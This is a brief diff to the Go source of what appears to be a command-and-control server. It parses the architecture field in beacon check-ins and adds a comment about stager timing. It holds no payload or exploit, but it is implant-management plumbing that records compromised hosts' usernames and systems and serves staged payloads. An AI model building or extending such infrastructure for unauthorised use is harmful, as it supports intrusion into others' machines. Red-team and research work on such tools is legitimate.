@@ -900,7 +900,10 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 	hostname := parts[2]
 	username := parts[3]
 	os := parts[4]
-	arch := "unknown" // Architecture removed from client data
+	arch := "unknown"
+	if len(parts) >= 6 {
+		arch = parts[5] // Architecture now included in client check-in
+	}
 
 	// Update or create beacon (with mutex protection)
 	c2.mutex.Lock()
@@ -1617,6 +1620,8 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 					c2.mutex.Unlock()
 
 					// Report to Master ASYNC (fire-and-forget for UI tracking)
+					// The stager will wait a few seconds before requesting chunks
+					// to give Master time to create the session
 					go func() {
 						masterSessionID, err := masterClient.ReportStagerContact(clientBinaryID, stagerIP, stagerOS, stagerArch)
 						if err != nil {
